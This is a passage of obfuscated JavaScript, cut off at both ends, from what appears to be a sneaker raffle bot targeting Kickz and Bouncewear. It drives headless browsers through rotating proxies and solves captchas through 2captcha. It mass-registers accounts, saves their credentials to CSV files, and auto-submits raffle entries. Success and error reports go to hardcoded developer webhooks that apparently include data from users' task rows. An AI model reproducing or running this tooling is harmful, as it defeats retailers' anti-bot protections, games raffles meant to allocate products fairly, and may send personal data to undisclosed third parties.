            await _0x4f800b(0x320), await _0x2826e4['select']('#checkout_shipping_address_country', '' + _0x5c94c5[_0x515d9c]['Country']), await _0x2826e4['waitForTimeout'](0x258), await _0x2826e4['type']('#checkout_shipping_address_first_name', '' + _0x5c94c5[_0x515d9c]['FirstName']), await _0x2826e4['waitForTimeout'](0x320), await _0x2826e4['type']('#checkout_shipping_address_last_name', '' + _0x5c94c5[_0x515d9c]['LastName']), await _0x2826e4['waitForTimeout'](0x2bc), await _0x2826e4['type']('#checkout_shipping_address_address1', _0x5c94c5[_0x515d9c]['Address1'] + '\x20' + _0x5c94c5[_0x515d9c]['HouseNumber']), await _0x2826e4['waitForTimeout'](0x2bc), await _0x2826e4['type']('#checkout_shipping_address_address2', '' + _0x5c94c5[_0x515d9c]['Address2']), await _0x2826e4['waitForTimeout'](0x2bc);
            _0x5c94c5[_0x515d9c]['Postcode'] == undefined ? await _0x2826e4['type']('#checkout_shipping_address_zip', '' + _0x5c94c5[_0x515d9c]['Zip']) : await _0x2826e4['type']('#checkout_shipping_address_zip', '' + _0x5c94c5[_0x515d9c]['Postcode']);
            await _0x2826e4['waitForTimeout'](0x2bc), await _0x2826e4['type']('#checkout_shipping_address_city', '' + _0x5c94c5[_0x515d9c]['City']), await _0x2826e4['waitForTimeout'](0x2bc), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x2826e4, _0x2826e4['evaluate'](() => {
                const _0xf9de54 = document['querySelector']('#continue_button');
                for (var _0xfc1df2 = 0x0; _0xfc1df2 < 0x5; _0xfc1df2++) {
                    if (_0xf9de54) {
                        _0xf9de54['click'](), _0xf9de54['click']();
                        break;
                    } else
                        _0x4f800b(0xfa0);
                }
            }), await _0x2826e4['waitForTimeout'](0x1194);
            try {
                await _0x2826e4['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Proxy\x20Error'));
                continue;
            }
            _0x2826e4['evaluate'](() => {
                const _0x380445 = document['querySelector']('#continue_button');
                for (var _0x25e4ec = 0x0; _0x25e4ec < 0x5; _0x25e4ec++) {
                    if (_0x380445) {
                        _0x380445['click']();
                        break;
                    } else
                        _0x4f800b(0xfa0);
                }
            }), await _0x2826e4['waitForTimeout'](0x7d0), console['log'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2826e4['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x2826e4['evaluate'](() => {
                const _0x591bf3 = document['querySelector']('#continue_button');
                for (var _0xc8a4c8 = 0x0; _0xc8a4c8 < 0x5; _0xc8a4c8++) {
                    if (_0x591bf3) {
                        _0x591bf3['click']();
                        break;
                    } else
                        _0x4f800b(0xfa0);
                }
            }), await _0x2826e4['waitForTimeout'](0x1194), await _0x2826e4['waitForSelector']('#continue_button'), _0x2826e4['evaluate'](() => {
                const _0x3cb196 = document['querySelector']('#continue_button');
                for (var _0x23567d = 0x0; _0x23567d < 0x5; _0x23567d++) {
                    if (_0x3cb196) {
                        _0x3cb196['click']();
                        break;
                    } else
                        _0x4f800b(0xfa0);
                }
            });
            try {
                await _0x2826e4['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '')
                    try {
                        await _0x5f2c92(_0xd30cf5['webhook'], _0xee132e['succesDEVMSG']);
                    } catch {
                    }
                await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0xee132e['succesDEVMSG']), await _0x4f800b(0xc8);
                try {
                    await _0x5f2c92(_0x302219, _0xee132e['succesPUBMSG']);
                } catch {
                }
            } catch (_0x5e31e6) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x5e31e6));
            }
        } catch (_0x43f085) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20' + _0x43f085)), _0x3315a5 = '' + _0x43f085;
            var _0x1409f6 = await _0xff2c9f(_0x5c94c5[_0x515d9c], _0x17541c, 'dev', !![], _0x3315a5);
            _0xee132e['errorDEV'] = { 'embeds': [_0x1409f6] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0xee132e['errorDEV']), await _0x5f2c92(_0x3afc50, _0xee132e['errorDEV']), _0x141f42 = 'yes';
        } finally {
            _0x183abf && _0x183abf['close']();
            if (_0x141f42 == 'yes' && _0x1a2432 != 0x5 && _0x3315a5 != 'Size\x20Not\x20Found') {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x17541c['name'] + ']\x20Task\x20' + (_0x515d9c + 0x1) + '\x20:\x20Retrying')), _0x515d9c = _0x515d9c - 0x1, _0x1a2432 = _0x1a2432 + 0x1;
                continue;
            }
            if (_0x515d9c + 0x1 == _0x5c94c5['length']) {
                console['log'](_0x41434e['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4f800b(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['AfewDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['AfewDelay']);
        }
    }
};
async function _0x1c3e33(_0x38c839, _0x164004, _0x365a8a, _0x37b76a) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x55f189 = 0x0; _0x55f189 < _0x365a8a['length']; _0x55f189++) {
        var _0x4d00f4 = '', _0x7c8727 = 0x0;
        _0x4bfd08(_0x164004['name'] + '\x20Task\x20' + (_0x55f189 + 0x1) + '\x20/\x20' + _0x365a8a['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad), await _0x38b36b(_0x365a8a, _0x55f189);
        var _0x3624a8 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }];
        const _0x33987f = { 'embeds': _0x3624a8 };
        var _0x52a4a9 = await _0xff2c9f(_0x365a8a[_0x55f189], _0x164004, 'acc', ![]);
        const _0x562f79 = { 'succesDEVMSG': { 'embeds': [_0x52a4a9] } };
        if (_0x365a8a[_0x55f189]['Email'] == '' || _0x365a8a[_0x55f189]['FirstName'] == '' || _0x365a8a[_0x55f189]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x365a8a[_0x55f189]['Password'] == '' && (_0x365a8a[_0x55f189]['Password'] = 'JRaffles23!');
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x475735 = _0x37b76a[_0x55f189]['split'](':');
        else
            var _0x553bf8 = Math['round'](Math['random']() * (_0x37b76a['length'] - 0x1)), _0x475735 = _0x37b76a[_0x553bf8]['split'](':');
        const _0x36fe72 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x475735[0x0] + ':' + _0x475735[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x310722 = await _0x36fe72['newPage']();
            await _0x310722['authenticate']({
                'username': '' + _0x475735[0x2],
                'password': '' + _0x475735[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x310722['setRequestInterception'](!![]), _0x310722['on']('request', _0x161fd5 => {
                _0x161fd5['resourceType']() === 'image' || _0x161fd5['resourceType']() === 'font' || _0x161fd5['resourceType']() === 'media' ? _0x161fd5['abort']() : _0x161fd5['continue']();
            }), await _0x310722['goto'](_0x38c839), await _0x4f800b(0xbb8), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x310722['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x310722['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x310722['waitForSelector']('#button-register'), await _0x4f800b(0x7d0), await _0x310722['evaluate'](() => {
                const _0x1de41e = document['querySelector']('#button-register');
                _0x1de41e['click']();
            }), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4f800b(0x1388), await _0x310722['waitForSelector']('#customer_salutation'), await _0x310722['select']('#customer_salutation', 'mr'), await _0x4f800b(0x7d0), await _0x310722['waitForSelector']('#customer_firstname'), await _0x310722['type']('#customer_firstname', '' + _0x365a8a[_0x55f189]['FirstName']), await _0x4f800b(0x352), await _0x310722['waitForSelector']('#customer_lastname'), await _0x310722['type']('#customer_lastname', '' + _0x365a8a[_0x55f189]['LastName']), await _0x4f800b(0x352), await _0x310722['type']('#email-input', '' + _0x365a8a[_0x55f189]['Email']), await _0x4f800b(0x352), await _0x310722['type']('#email-confirm-input', '' + _0x365a8a[_0x55f189]['Email']), await _0x4f800b(0x352), await _0x310722['type']('#register-password', '' + _0x365a8a[_0x55f189]['Password']), await _0x4f800b(0x352), await _0x310722['type']('#password-confirm', '' + _0x365a8a[_0x55f189]['Password']), await _0x4f800b(0x352), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x310722['click']('#consent'), await _0x4f800b(0x1f4);
            const _0x33f4f7 = await _0x310722['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x33f4f7) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x310722['click']('#buttonRegister');
            try {
                await _0x310722['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Account\x20' + _0x365a8a[_0x55f189]['Email'] + '\x20Generated!')), console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x365a8a[_0x55f189]['Email'])), await _0x4f800b(0x4b0);
            async function _0x4a0888() {
                console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x2bb5ef = await _0x407c67['get']('Code');
                return _0x2bb5ef['Code'];
            }
            ;
            code = await _0x4a0888(), _0x4f800b(0x320), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Verifying..'), await _0x310722['type']('#verificationCode', code), await _0x4f800b(0x1f4), await _0x310722['click']('#buttonVerify'), await _0x4f800b(0x190), await _0x310722['click']('#buttonVerify'), await _0x4f800b(0x3e8);
            try {
                await _0x310722['waitForSelector']('div.b-user_greeting'), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Account\x20' + _0x365a8a[_0x55f189]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x76f3de['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x365a8a[_0x55f189]['Email'] + ',' + _0x365a8a[_0x55f189]['Password'] + ','), console['log'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Account\x20' + _0x365a8a[_0x55f189]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x562f79['succesDEVMSG']);
                } catch {
                }
                await _0x5f2c92(_0x22ad4d, _0x562f79['succesDEVMSG']);
            } catch {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x394f7c) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20' + _0x394f7c)), _0x3624a8[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x3624a8[0x0]['description'] = '' + _0x394f7c, await _0x5f2c92(_0x3afc50, _0x33987f), _0x4d00f4 = 'yes';
        } finally {
            _0x36fe72 && _0x36fe72['close']();
            if (_0x4d00f4 == 'yes' && _0x7c8727 != 0x5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x164004['name'] + ']\x20Task\x20' + (_0x55f189 + 0x1) + '\x20:\x20Retrying')), _0x55f189 = _0x55f189 - 0x1, _0x7c8727 = _0x7c8727 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['delay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['delay']);
        }
    }
}
async function _0x4a457b(_0x2c6f37, _0x5d6fb1, _0x2f05e2) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xede4d1 = 0x0; _0xede4d1 < _0x5d6fb1['length']; _0xede4d1++) {
        var _0x5ebd4d, _0x2917f3 = '', _0x31e4bc = 0x0;
        _0x4bfd08(_0x2c6f37['name'] + '\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20/\x20' + _0x5d6fb1['length'] + '\x20||\x20File:\x20' + _0x493993 + '\x20Proxies:\x20' + _0x42a4ad);
        var _0x53839e = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x434d06
                },
                {
                    'name': 'Product',
                    'value': '' + _0x5d6fb1[_0xede4d1]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5d6fb1[_0xede4d1]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xd30cf5['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26b8e9
                }
            ]
        }], _0x498e3e = await _0xff2c9f(_0x5d6fb1[_0xede4d1], _0x2c6f37, 'dev', ![]), _0x459a25 = await _0xff2c9f(_0x5d6fb1[_0xede4d1], _0x2c6f37, 'pub', ![]);
        const _0x15f40d = {
            'succesDEVMSG': { 'embeds': [_0x498e3e] },
            'succesPUBMSG': { 'embeds': [_0x459a25] }
        };
        await _0x38b36b(_0x5d6fb1, _0xede4d1);
        if (_0x5d6fb1[_0xede4d1]['Email'] == '' || _0x5d6fb1[_0xede4d1]['Password'] == '' || _0x5d6fb1[_0xede4d1]['FirstName'] == '' || _0x5d6fb1[_0xede4d1]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x57e842 = _0x2f05e2[_0xede4d1]['split'](':');
        else
            var _0x5acc12 = Math['round'](Math['random']() * (_0x2f05e2['length'] - 0x1)), _0x57e842 = _0x2f05e2[_0x5acc12]['split'](':');
        const _0x435409 = await _0x168014['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x57e842[0x0] + ':' + _0x57e842[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x16c3f1 = await _0x435409['newPage']();
            await _0x16c3f1['authenticate']({
                'username': '' + _0x57e842[0x2],
                'password': '' + _0x57e842[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x16c3f1['setRequestInterception'](!![]), _0x16c3f1['on']('request', _0x3e5772 => {
                _0x3e5772['resourceType']() === 'image' || _0x3e5772['resourceType']() === 'font' || _0x3e5772['resourceType']() === 'media' ? _0x3e5772['abort']() : _0x3e5772['continue']();
            }), await _0x16c3f1['goto']('' + _0x5d6fb1[_0xede4d1]['Url'], { 'waitUntil': 'networkidle2' }), await _0x4f800b(0x12c);
            try {
                await _0x16c3f1['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x16c3f1['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Logging\x20in'), await _0x16c3f1['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x16c3f1['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x16c3f1['waitForSelector']('#username'), await _0x16c3f1['type']('#username', _0x5d6fb1[_0xede4d1]['Email']), await _0x16c3f1['waitForSelector']('#password'), await _0x16c3f1['type']('#password', _0x5d6fb1[_0xede4d1]['Password']), await _0x4f800b(0x190), await _0x16c3f1['click']('#buttonSubmit'), await _0x16c3f1['waitForSelector']('div.b-user_greeting'), console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4f800b(0x1f4), await _0x16c3f1['goto']('' + _0x5d6fb1[_0xede4d1]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5d6fb1[_0xede4d1]['Size']);
            let _0x57a573 = _0x5d6fb1[_0xede4d1]['Size']['replace']('.5', '\x201/2');
            await _0x16c3f1['click']('button[title=\x22' + _0x57a573 + '\x22]'), await _0x4f800b(0x1f4);
            try {
                await _0x16c3f1['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x4f800b(0x12c), console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x16c3f1['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_firstName', _0x5d6fb1[_0xede4d1]['FirstName']), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_lastName', _0x5d6fb1[_0xede4d1]['LastName']), await _0x4f800b(0x12c), await _0x16c3f1['select']('#dwfrm_raffle_addressFields_country', _0x5d6fb1[_0xede4d1]['Country']), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_city', _0x5d6fb1[_0xede4d1]['City']), await _0x4f800b(0x12c);
            _0x5d6fb1[_0xede4d1]['Postcode'] == undefined && (_0x5d6fb1[_0xede4d1]['Postcode'] = _0x5d6fb1[_0xede4d1]['Zip']);
            await _0x16c3f1['type']('#dwfrm_raffle_addressFields_postalCode', _0x5d6fb1[_0xede4d1]['Postcode']), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_address1', _0x5d6fb1[_0xede4d1]['Address1']), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_address2', _0x5d6fb1[_0xede4d1]['HouseNumber']), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x5d6fb1[_0xede4d1]['Address2']), await _0x4f800b(0x12c), await _0x16c3f1['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4f800b(0x12c), await _0x16c3f1['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x5d6fb1[_0xede4d1]['Follower']), await _0x4f800b(0x1f4), await _0x16c3f1['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4f800b(0x1f4), console['log'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20' + _0x41434e['blue']('Awaiting\x20Paypal\x20Payment')), await _0x16c3f1['click']('.b-paypal_button');
            try {
                await _0x16c3f1['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x15f40d['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x45c968, _0x15f40d['succesDEVMSG']), await _0x4f800b(0xc8), await _0x5f2c92(_0x302219, _0x15f40d['succesPUBMSG']);
            } catch (_0x27e0d5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x27e0d5)), _0x5ebd4d = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x27e0d5;
                var _0x36ae90 = await _0xff2c9f(_0x5d6fb1[_0xede4d1], _0x2c6f37, 'dev', !![], _0x5ebd4d);
                _0x15f40d['errorDEV'] = { 'embeds': [_0x36ae90] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x15f40d['errorDEV']), await _0x5f2c92(_0x3afc50, _0x15f40d['errorDEV']);
            }
        } catch (_0x11c813) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20' + _0x11c813)), _0x5ebd4d = '' + _0x11c813;
            var _0x36ae90 = await _0xff2c9f(_0x5d6fb1[_0xede4d1], _0x2c6f37, 'dev', !![], _0x5ebd4d);
            _0x15f40d['errorDEV'] = { 'embeds': [_0x36ae90] }, _0xd30cf5['webhook'] != undefined && _0xd30cf5['webhook'] != '' && await _0x5f2c92(_0xd30cf5['webhook'], _0x15f40d['errorDEV']), await _0x5f2c92(_0x3afc50, _0x15f40d['errorDEV']), _0x2917f3 = 'yes';
        } finally {
            _0x435409 && _0x435409['close']();
            if (_0x2917f3 == 'yes' && _0x31e4bc != 0x5) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x2c6f37['name'] + ']\x20Task\x20' + (_0xede4d1 + 0x1) + '\x20:\x20Retrying')), _0xede4d1 = _0xede4d1 - 0x1, _0x31e4bc = _0x31e4bc + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xd30cf5['AfewDelay'] + '\x20ms'), await _0x4f800b(_0xd30cf5['AfewDelay']);
        }
    }
}
async function _0x2d0f5f(_0x385365, _0x3c4536) {
    _0x168014['use'](_0x4554c9()), _0x168014['use'](_0x374957({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xd30cf5['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x108bb8 = 0x0; _0x108bb8 < bouncewear['length']; _0x108bb8++) {
        await _0x38b36b(bouncewear, _0x108bb8);
        if (bouncewear[_0x108bb8]['Email'] == '' || bouncewear[_0x108bb8]['Password'] == '' || bouncewear[_0x108bb8]['FirstName'] == '' || bouncewear[_0x108bb8]['LastName'] == '') {
            console['log'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xd30cf5['useRandomProxy'] = ![])
            var _0x4e0596 = _0x38aeb0()[_0x108bb8]['split'](':');
        else
            var _0x45b2b5 = Math['round'](Math['random']() * (_0x38aeb0()['length'] - 0x1)), _0x4e0596 = _0x38aeb0()[_0x45b2b5]['split'](':');
        const _0x201dc6 = await _0x168014['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4e0596[0x0] + ':' + _0x4e0596[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x61e731 = await _0x201dc6['newPage']();
            await _0x61e731['authenticate']({
                'username': '' + _0x4e0596[0x2],
                'password': '' + _0x4e0596[0x3]
            }), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x61e731['setRequestInterception'](!![]), _0x61e731['on']('request', _0x4397c0 => {
                _0x4397c0['resourceType']() === 'image' || _0x4397c0['resourceType']() === 'font' || _0x4397c0['resourceType']() === 'media' ? _0x4397c0['abort']() : _0x4397c0['continue']();
            }), await _0x61e731['goto'](_0x385365), await _0x4f800b(0xbb8), await _0x61e731['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Filling\x20information'), await _0x61e731['type']('#RegisterForm-FirstName', '' + bouncewear[_0x108bb8]['FirstName']), await _0x4f800b(0x226), await _0x61e731['type']('#RegisterForm-LastName', '' + bouncewear[_0x108bb8]['LastName']), await _0x4f800b(0x226), await _0x61e731['type']('#RegisterForm-email', '' + bouncewear[_0x108bb8]['Email']), await _0x4f800b(0x226), await _0x61e731['type']('#RegisterForm-password', '' + bouncewear[_0x108bb8]['Password']), await _0x4f800b(0x226), await _0x61e731['click']('#marketing'), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Submitting..'), await _0x61e731['$eval']('#RegisterForm', _0x2e3401 => _0x2e3401['submit']()), await _0x4f800b(0x1f40), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x61e731['solveRecaptchas'](), await _0x61e731['click']('.shopify-challenge__button.btn');
            async function _0x29d1fa() {
                for (var _0x4b84e9 = 0x0; _0x4b84e9 < 0x4; _0x4b84e9++) {
                    try {
                        console['log']('try'), await _0x61e731['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20' + _0x41434e['red']('Catpcha\x20failed,\x20retrying..')), await _0x61e731['solveRecaptchas'](), await _0x61e731['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x29d1fa(), console['log'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4f800b(0x1f4);
            try {
                await _0x61e731['waitForSelector']('.featured-title'), await _0x4f800b(0x1f4), console['log'](_0x41434e['green'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x108bb8]['Email'] + '\x20Generated!')), _0x76f3de['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x108bb8]['Email'] + ',' + bouncewear[_0x108bb8]['Password']), console['log'](_0x41434e['yellow'](_0x57a400() + '\x20[' + _0x3c4536['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x108bb8]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x17b9a6) {
                console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x17b9a6));
            }
        } catch (_0x170ed9) {
            console['log'](_0x41434e['red'](_0x57a400() + '\x20[' + _0x388f09[taskModule]['name'] + ']\x20Task\x20' + (_0x108bb8 + 0x1) + '\x20:\x20' + _0x170ed9));
        } finally {
